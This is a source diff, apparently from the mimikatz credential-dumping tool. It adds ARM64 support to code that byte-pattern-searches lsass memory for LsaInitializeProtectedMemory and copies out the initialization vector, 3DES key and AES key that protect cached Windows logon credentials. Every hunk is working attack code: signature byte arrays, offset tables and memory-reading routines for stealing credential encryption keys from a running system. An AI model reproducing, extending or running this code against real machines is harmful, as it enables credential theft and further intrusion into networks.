@@ -5,7 +5,12 @@
 */
 #include "kuhl_m_sekurlsa_nt6.h"
 
-#ifdef _M_X64
+#if defined(_M_ARM64)
+BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x43, 0x00, 0x80, 0x52, 0x02, 0x02, 0x80, 0x52, 0xE1, 0x43, 0x00, 0x91, 0x00, 0x00, 0x80, 0xD2, 0x20, 0x01, 0x3F, 0xD6, 0xF3, 0x03, 0x00, 0x2A };
+KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {80, 4, -60, 12, 28, 8}},
+};
+#elif defined(_M_X64)
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
 BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
@@ -23,7 +28,6 @@ KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // Init
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
 };
-
 #endif
 
 NTSTATUS kuhl_m_sekurlsa_nt6_KeyInit = STATUS_NOT_FOUND;
@@ -147,7 +151,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 	NTSTATUS status = STATUS_NOT_FOUND;
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
-#ifdef _M_X64
+#if defined(_M_X64)
 	LONG offset64;
 #endif
 	PKULL_M_PATCH_GENERIC currentReference;
@@ -155,36 +159,51 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 	{
 		aLocalMemory.address = currentReference->Search.Pattern;
 		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
-	{
-		aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
-#ifdef _M_X64
-		aLocalMemory.address = &offset64;
-		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
 		{
-			aLsassMemory.address = (PBYTE) aLsassMemory.address + sizeof(LONG) + offset64;
-#elif defined _M_IX86
-		aLocalMemory.address = &aLsassMemory.address;
-		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
-		{
-#endif
-			aLocalMemory.address = InitializationVector;
-			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
+			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
+			#if defined(_M_ARM64)
+			if(aLsassMemory.address = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0))
 			{
-				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
-				if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des))
+			#elif defined(_M_X64)
+			aLocalMemory.address = &offset64;
+			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
+			{
+				aLsassMemory.address = (PBYTE) aLsassMemory.address + sizeof(LONG) + offset64;
+			#elif defined(_M_IX86)
+			aLocalMemory.address = &aLsassMemory.address;
+			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
+			{
+			#endif
+				aLocalMemory.address = InitializationVector;
+				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
 				{
-					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
-					if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes))
-						status = STATUS_SUCCESS;
+					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
+					if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des, 
+						#if defined(_M_ARM64)
+						currentReference->Offsets.armOff1
+						#else
+						0
+						#endif
+						))
+					{
+						aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
+						if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes,
+							#if defined(_M_ARM64)
+							currentReference->Offsets.armOff2
+							#else
+							0
+							#endif
+							))
+							status = STATUS_SUCCESS;
+					}
 				}
 			}
 		}
 	}
-	}
 	return status;
 }
 
-BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey)
+BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
 {
 	BOOL status = FALSE;
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
@@ -210,14 +229,17 @@ BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M
 
 	if(buffer = LocalAlloc(LPTR, taille))
 	{
-	#ifdef _M_X64
+	#if defined(_M_ARM64)
+		if (aLsassMemory->address = kull_m_memory_arm64_getRealAddress(aLsassMemory, armOffset)) // TODO:ARM64
+		{
+	#elif defined(_M_X64)
 		LONG offset64;
 		aLocalMemory.address = &offset64;
 		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
 		{
 			aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
 			aLocalMemory.address = &aLsassMemory->address;
-	#elif defined _M_IX86
+	#elif defined(_M_IX86)
 		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
 		{
 	#endif
